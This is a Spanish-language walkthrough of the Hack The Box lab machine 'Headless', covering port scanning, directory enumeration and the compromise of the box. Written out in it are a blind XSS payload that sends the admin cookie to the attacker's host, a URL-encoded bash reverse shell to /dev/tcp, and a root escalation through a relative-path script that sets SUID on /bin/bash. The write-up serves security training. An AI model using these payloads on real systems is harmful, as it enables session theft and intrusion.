---
icon: desktop
layout:
  title:
    visible: true
  description:
    visible: false
  tableOfContents:
    visible: true
  outline:
    visible: true
  pagination:
    visible: true
---

# Headless

`Headless` es una máquina Linux de dificultad fácil que cuenta con un servidor `Python Werkzeug` que aloja un sitio web. El sitio web tiene un formulario de soporte al cliente, que se ha descubierto que es vulnerable a Cross-Site Scripting (XSS) ciego a través del encabezado `User-Agent`. Esta vulnerabilidad se aprovecha para robar una cookie de administrador, que luego se utiliza para acceder al panel de control del administrador. La página es vulnerable a la inyección de comandos, lo que lleva a un shell inverso en el equipo. Al enumerar el correo del usuario se revela un script que no utiliza rutas absolutas, que se aprovecha para obtener un shell como root.

<figure><img src="../../.gitbook/assets/Headless.png" alt="" width="563"><figcaption></figcaption></figure>

***





```bash
❯ nmap -p- --open -sS --min-rate 1000 -vvv -Pn -n 10.10.11.8 -oG allPorts
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.95 ( https://nmap.org ) at 2025-01-27 00:11 CET
Initiating SYN Stealth Scan at 00:12
Scanning 10.10.11.8 [65535 ports]
Discovered open port 22/tcp on 10.10.11.8
Discovered open port 5000/tcp on 10.10.11.8
Completed SYN Stealth Scan at 00:12, 18.92s elapsed (65535 total ports)
Nmap scan report for 10.10.11.8
Host is up, received user-set (0.069s latency).
Scanned at 2025-01-27 00:12:00 CET for 18s
Not shown: 65533 closed tcp ports (reset)
PORT     STATE SERVICE REASON
22/tcp   open  ssh     syn-ack ttl 63
5000/tcp open  upnp    syn-ack ttl 63

Read data files from: /usr/share/nmap
Nmap done: 1 IP address (1 host up) scanned in 19.07 seconds
           Raw packets sent: 65627 (2.888MB) | Rcvd: 65636 (2.626MB)
```



```bash
❯ extractPorts allPorts

[*] Extracting information...

	[*] IP Address: 10.10.11.8
	[*] Open ports: 22,5000

[*] Ports copied to clipboard
```



```bash
❯ nmap -sCV -p22,5000 10.10.11.8 -A -oN targeted -oX targetedXML
Starting Nmap 7.95 ( https://nmap.org ) at 2025-01-27 00:17 CET
Nmap scan report for 10.10.11.8
Host is up (0.056s latency).

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 9.2p1 Debian 2+deb12u2 (protocol 2.0)
| ssh-hostkey: 
|   256 90:02:94:28:3d:ab:22:74:df:0e:a3:b2:0f:2b:c6:17 (ECDSA)
|_  256 2e:b9:08:24:02:1b:60:94:60:b3:84:a9:9e:1a:60:ca (ED25519)
5000/tcp open  http    Werkzeug httpd 2.2.2 (Python 3.11.2)
|_http-title: Under Construction
|_http-server-header: Werkzeug/2.2.2 Python/3.11.2
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running: Linux 4.X|5.X
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
OS details: Linux 4.15 - 5.19, Linux 5.0 - 5.14
Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 22/tcp)
HOP RTT       ADDRESS
1   108.99 ms 10.10.16.1
2   31.35 ms  10.10.11.8

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 11.98 seconds

```





```bash
❯ xsltproc targetedXML > index.html

❯ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```



<figure><img src="../../.gitbook/assets/imagen (1).png" alt=""><figcaption></figcaption></figure>



<figure><img src="../../.gitbook/assets/imagen (1) (1).png" alt=""><figcaption></figcaption></figure>



<figure><img src="../../.gitbook/assets/imagen (3).png" alt=""><figcaption></figcaption></figure>



<figure><img src="../../.gitbook/assets/imagen (4).png" alt=""><figcaption></figcaption></figure>





```bash
❯ gobuster dir -u http://10.10.11.8:5000 -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -t 200
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.11.8:5000
[+] Method:                  GET
[+] Threads:                 200
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/support              (Status: 200) [Size: 2363]
/dashboard            (Status: 500) [Size: 265]
```



<figure><img src="../../.gitbook/assets/imagen (5).png" alt=""><figcaption></figcaption></figure>



<figure><img src="../../.gitbook/assets/imagen (6).png" alt=""><figcaption></figcaption></figure>



<figure><img src="../../.gitbook/assets/imagen (7).png" alt=""><figcaption></figcaption></figure>



httponly --> false

<figure><img src="../../.gitbook/assets/imagen (8).png" alt=""><figcaption></figcaption></figure>





<figure><img src="../../.gitbook/assets/imagen (9).png" alt=""><figcaption></figcaption></figure>



<figure><img src="../../.gitbook/assets/imagen (10).png" alt=""><figcaption></figcaption></figure>



<figure><img src="../../.gitbook/assets/imagen (11).png" alt=""><figcaption></figcaption></figure>



```bash
❯ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```



```javascript
<script>var i=new Image(); i.src="http://10.10.16.5/?cookie="+document.cookie;</script>
```



```bash
❯ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.10.16.5 - - [27/Jan/2025 00:38:22] "GET /?cookie=is_admin=InVzZXIi.uAlmXlTvm8vyihjNaPDWnvB_Zfs HTTP/1.1" 200 -
10.10.11.8 - - [27/Jan/2025 00:38:28] "GET /?cookie=is_admin=ImFkbWluIg.dmzDkZNEm6CK0oyL1fbM-SnXpH0 HTTP/1.1" 200 -
```



```bash
❯ echo 'ImFkbWluIg' | base64 -d; echo
"admin"
❯ echo 'dmzDkZNEm6CK0oyL1fbM-SnXpH0' | base64 -d; echo
vlÑ�D���Ҍ����base64: entrada inválida
```



<figure><img src="../../.gitbook/assets/imagen (13).png" alt=""><figcaption></figcaption></figure>



<figure><img src="../../.gitbook/assets/imagen (15).png" alt=""><figcaption></figcaption></figure>



<figure><img src="../../.gitbook/assets/imagen (16).png" alt=""><figcaption></figcaption></figure>



<figure><img src="../../.gitbook/assets/imagen (17).png" alt=""><figcaption></figcaption></figure>

subprocess.run or os.system



<figure><img src="../../.gitbook/assets/imagen (18).png" alt=""><figcaption></figcaption></figure>



```bash
❯ nc -nlvp 443
listening on [any] 443 ...

```



```bash
bash+-c+'bash+-i+>%26+/dev/tcp/10.10.16.5/443+0>%261'
```

<figure><img src="../../.gitbook/assets/4214_vmware_Ks6spiAlaS.png" alt=""><figcaption></figcaption></figure>



```bash
❯ nc -nlvp 443
listening on [any] 443 ...
connect to [10.10.16.5] from (UNKNOWN) [10.10.11.8] 52348
bash: cannot set terminal process group (1379): Inappropriate ioctl for device
bash: no job control in this shell
dvir@headless:~/app$ cat /home/dvir/user.txt
cat /home/dvir/user.txt
4d7ed1324***********************
```



```bash
dvir@headless:~/app$ sudo -l
Matching Defaults entries for dvir on headless:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin,
    use_pty

User dvir may run the following commands on headless:
    (ALL) NOPASSWD: /usr/bin/syscheck
```



```bash
dvir@headless:~/app$ cat /usr/bin/syscheck
#!/bin/bash

if [ "$EUID" -ne 0 ]; then
  exit 1
fi

last_modified_time=$(/usr/bin/find /boot -name 'vmlinuz*' -exec stat -c %Y {} + | /usr/bin/sort -n | /usr/bin/tail -n 1)
formatted_time=$(/usr/bin/date -d "@$last_modified_time" +"%d/%m/%Y %H:%M")
/usr/bin/echo "Last Kernel Modification Time: $formatted_time"

disk_space=$(/usr/bin/df -h / | /usr/bin/awk 'NR==2 {print $4}')
/usr/bin/echo "Available disk space: $disk_space"

load_average=$(/usr/bin/uptime | /usr/bin/awk -F'load average:' '{print $2}')
/usr/bin/echo "System load average: $load_average"

if ! /usr/bin/pgrep -x "initdb.sh" &>/dev/null; then
  /usr/bin/echo "Database service is not running. Starting it..."
  ./initdb.sh 2>/dev/null
else
  /usr/bin/echo "Database service is running."
fi

exit 0
dvir@headless:~/app$ ls -l /usr/bin/syscheck
-r-xr-xr-x 1 root root 768 Feb  2  2024 /usr/bin/syscheck
```



```bash
dvir@headless:/tmp$ ls -l /bin/bash
-rwxr-xr-x 1 root root 1265648 Apr 24  2023 /bin/bash
dvir@headless:/tmp$ cat initdb.sh
#!/bin/bash

chmod u+s /bin/bash
dvir@headless:/tmp$ chmod +x initdb.sh
dvir@headless:/tmp$ sudo /usr/bin/syscheck
Last Kernel Modification Time: 01/02/2024 10:05
Available disk space: 2.0G
System load average:  0.00, 0.00, 0.00
Database service is not running. Starting it...
dvir@headless:/tmp$ ls -l /bin/bash
-rwsr-xr-x 1 root root 1265648 Apr 24  2023 /bin/bash
```



```bash
dvir@headless:/tmp$ bash -p
bash-5.2# whoami
root
bash-5.2# cat /root/root.txt
9f968961c41*********************
```
